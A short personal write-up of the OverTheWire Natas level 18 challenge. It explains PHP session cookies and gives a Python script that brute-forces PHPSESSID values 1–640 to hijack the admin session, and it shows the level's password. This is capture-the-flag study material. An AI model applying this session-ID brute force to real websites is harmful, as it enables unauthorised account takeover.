
2024-07-20 16:35

Source: #web #py

Tags: [[PHP]]

- PHP uses one of two methods to keep track of sessions. If cookies are enabled, like in our case, it uses them.
- If cookies are disabled, it uses the URL.
here in the source we are given `maxid` as `640`

```
import requests
username = 'natas18'
password = '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ'

url = 'http://natas18.natas.labs.overthewire.org/'
session = requests.Session()

for session_id in range(1,641):
    response = session.get(url,cookies = {"PHPSESSID": str(session_id)}, auth = (username,password))

    content = response.text

    if("You are an admin" in content):
        print("Got it!",session_id)
        print(content)
        break
    else:
        print("trying", session_id)
```
### TLDR
we gotta brute force all the possible session id's ranging from 1 to 640 and one of the session id is gotta be the admin session id

### References
https://www.youtube.com/watch?v=C9yxUTQLbRI

phpsessid - https://stackoverflow.com/questions/1370951/what-is-phpsessid